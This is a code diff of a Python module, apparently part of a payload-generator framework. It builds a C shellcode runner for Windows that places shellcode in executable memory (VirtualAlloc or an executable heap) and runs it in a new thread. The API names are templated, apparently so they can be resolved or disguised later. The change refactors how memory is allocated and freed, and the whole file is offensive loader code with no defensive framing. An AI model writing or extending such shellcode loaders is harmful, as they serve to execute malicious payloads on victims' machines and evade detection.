@@ -2,19 +2,28 @@ from string import Template
 
 class shellcoderunner:
     def __init__(self, arguments):
+        self.apicallsList = ['CreateThread', 'WaitForSingleObject', 'CloseHandle']
         self.allocation = 'VirtualAlloc'
         if 'allocation' in arguments:
             self.allocation = arguments['allocation']
-
         if self.allocation == 'VirtualAlloc':
             self.allocationCode = """
     LPVOID buffer = {VirtualAlloc}(NULL, {shellcodeSize}, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
 """
+            self.freeCode = """
+    {VirtualFree}(buffer, 0, MEM_RELEASE);
+"""
+            self.apicallsList += ['VirtualAlloc', 'VirtualFree']
         elif self.allocation == 'HeapAlloc':
             self.allocationCode = """
     HANDLE hHeap = {HeapCreate}(HEAP_CREATE_ENABLE_EXECUTE, {shellcodeSize}, 0);
     LPVOID buffer = {HeapAlloc}(hHeap, HEAP_ZERO_MEMORY, {shellcodeSize});
 """
+            self.freeCode = """
+    {HeapFree}(hHeap, 0, buffer);
+    {HeapDestroy}(hHeap);
+"""
+            self.apicallsList += ['HeapCreate', 'HeapAlloc', 'HeapFree', 'HeapDestroy']
 
     def imports(self) -> list[str]:
         return ["#include <windows.h>", 
@@ -25,16 +34,10 @@ class shellcoderunner:
         return []
     
     def codeblocks(self) -> str:
-        return """"""
+        return ''
 
     def apicalls(self) -> list[str]:
-        return ['CreateThread',
-                'WaitForSingleObject',
-                'CloseHandle',
-                'VirtualAlloc',
-                'HeapAlloc',
-                'HeapCreate',
-                'VirtualFree']
+        return self.apicallsList
 
     def template(self) -> str:
         return Template("""
@@ -54,7 +57,5 @@ class shellcoderunner:
     {CloseHandle}(hThread);
 
     // Clean up by freeing the memory we allocated for our shellcode
-    {VirtualFree}(buffer, 0, MEM_RELEASE);
-
-    return 0;
-""").substitute(allocation=self.allocationCode)
+    $free
+""").substitute(allocation=self.allocationCode, free=self.freeCode)
